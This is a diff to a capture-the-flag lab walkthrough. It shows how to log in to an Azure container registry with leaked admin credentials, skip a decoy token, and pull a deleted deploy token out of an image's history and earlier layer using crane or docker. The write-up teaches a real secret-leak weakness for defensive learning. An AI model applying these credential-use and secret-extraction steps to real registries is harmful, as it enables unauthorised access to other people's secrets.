@@ -28,12 +28,12 @@ dissect a container image**.
 read resource tags  -->  ACR admin username + password (leaked on the storage account)
     |
     v
-docker login <registry>.azurecr.io  -->  docker pull cumulonimbus/app:latest
+authenticate + pull the image (crane, or docker)
     |
-    +--> docker run -it ... sh      -->  /app/config/app.config  (DECOY: rotated token)
+    +--> flattened filesystem        -->  /app/config/app.config  (DECOY: rotated token)
     |
     v
-docker history --no-trunc / docker save  -->  deleted layer  -->  DEPLOY_TOKEN = flag
+image history / earlier layer       -->  "deleted" file  -->  DEPLOY_TOKEN = flag
 ```
 
 ### Step 1 — Login as the attacker
@@ -64,42 +64,64 @@ You'll get the registry login server, `ci-registry-username`, and
 
 ### Step 3 — Authenticate to the registry and pull the image
 
-```bash
-docker login <login-server> -u <ci-registry-username> -p <ci-registry-password>
-docker pull <login-server>/cumulonimbus/app:latest
-```
-
-### Step 4 — Run it interactively (find the decoy + the breadcrumb)
+The Cumulonimbus container has **no Docker daemon**, so use `crane` (a
+single-binary registry client, pre-installed in the image). Authenticate with the
+leaked admin credentials:
 
 ```bash
-docker run --rm -it <login-server>/cumulonimbus/app:latest sh
-cat /app/config/app.config
+LOGIN_SERVER=<login-server>          # e.g. cnacr....azurecr.io
+crane auth login $LOGIN_SERVER -u <ci-registry-username> -p <ci-registry-password>
+IMG=$LOGIN_SERVER/cumulonimbus/app:latest
 ```
 
-This reveals `legacy_deploy_token=CUMULONIMBUS{...}` — but read the note: it's an
-**old, rotated** value (a decoy), and the real token was removed in a later build
-step.
+### Step 4 — Find the decoy (the file that survives in the filesystem)
+
+```bash
+crane export $IMG - | grep -ao 'CUMULONIMBUS{[^}]*}' | sort -u
+```
+
+That's `legacy_deploy_token` from `/app/config/app.config` — an **old, rotated**
+value (a decoy). The real token was removed in a later build step.
 
 ### Step 5 — Recover the real secret from the deleted layer
 
 The credential was written to `/root/.deploy_token` in one layer and `rm`'d in
-the next. It's gone from the running filesystem but still in the image:
+the next. It's gone from the flattened filesystem, but it still lives in the
+image's **history** (the command that wrote it) and in the earlier layer's blob:
 
 ```bash
-# Quickest: the build command itself is preserved in the image history.
-docker history --no-trunc <login-server>/cumulonimbus/app:latest | grep -i deploy_token
-
-# Or extract the layers and grep them:
-docker save <login-server>/cumulonimbus/app:latest -o image.tar
-mkdir image && tar -xf image.tar -C image
-grep -rao 'CUMULONIMBUS{[^}]*}' image/
+crane config $IMG | grep -ao 'CUMULONIMBUS{[^}]*}' | sort -u
 ```
 
 The `DEPLOY_TOKEN` value is the flag.
 
-> No Docker handy? You can do the same with registry tooling, e.g.
-> `crane export <login-server>/cumulonimbus/app:latest - | tar -tv` and
-> `crane config <login-server>/cumulonimbus/app:latest` (history), or `oras`.
+#### With Docker instead (on a host that has a daemon)
+
+| Purpose | crane (in-container) | Docker |
+|---|---|---|
+| Authenticate | `crane auth login -u <user> -p <pass>` | `docker login <login-server> -u <user> -p <pass>` |
+| Get the image | (implicit) | `docker pull $IMG` |
+| Decoy (flattened filesystem) | `crane export $IMG -` | `docker run --rm -it $IMG sh` → `cat /app/config/app.config` |
+| Real flag (image history) | `crane config $IMG` | `docker history --no-trunc $IMG` |
+| Pull the layers apart | per-layer `crane blob` | `docker save $IMG -o image.tar && tar -xf image.tar -C image` then `grep -rao 'CUMULONIMBUS{[^}]*}' image/` |
+
+#### What the image history actually is
+
+A Docker/OCI image is a stack of read-only layers plus a config JSON that
+includes a `history` array — one entry per build step, recording the instruction
+that produced it (`created_by`). For a shell-form `RUN`, `created_by` is the
+literal command that executed:
+
+```
+/bin/sh -c printf 'DEPLOY_TOKEN=CUMULONIMBUS{...}' > /root/.deploy_token
+```
+
+`crane config` / `docker history` just print that array. This is why an inline
+secret in a `RUN` leaks even after the file is removed: a later `rm` deletes the
+*file* from the final filesystem, but the *command text* (with the secret) is
+permanently recorded in the history — and the file itself still exists in the
+earlier layer's blob. Deleting a secret in a Dockerfile does **not** scrub it
+from the image.
 
 ## How to Fix in Production
 
